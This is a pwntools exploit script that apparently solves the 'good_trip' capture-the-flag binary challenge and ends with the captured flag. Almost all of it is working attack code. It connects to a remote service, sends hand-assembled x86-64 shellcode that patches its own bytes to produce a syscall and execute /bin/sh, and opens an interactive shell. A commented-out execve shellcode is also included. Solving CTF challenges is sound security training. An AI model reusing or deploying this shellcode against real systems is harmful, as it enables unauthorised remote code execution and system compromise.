#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template good_trip --host 172.210.129.230 --port 1351
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'good_trip')
context.terminal = "/home/royalgamer/.local/src/st/st"

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or '172.210.129.230'
port = int(args.PORT or 1351)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

# shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x90\x05"

shellcode =b""
shellcode = shellcode+ b"\x48\xbf\x2d\x10\x13\x37\x13\x00\x00\x00"
shellcode =shellcode+ b"\xb8\x0f\x04\x90\x90\x48\x05\x00\x01\x00\x00\x48\x89\x07"
shellcode += b"\x48\xbf\x35\x10\x13\x37\x13\x00\x00\x00\xb8\x3b\x00\x00\x00\x48\x31\xf6\x48\x31\xd2"
shellcode += b"x"*8
shellcode += b"/bin/sh\x00"
io.recvuntil(b"code size >> ")
io.sendline(b"0")
io.recvuntil(b"code >> ")
io.sendline(shellcode)

io.interactive()

# AKASEC{y34h_You_C4N7_PRO73C7_5om37hIn9_YoU_doN7_h4V3}
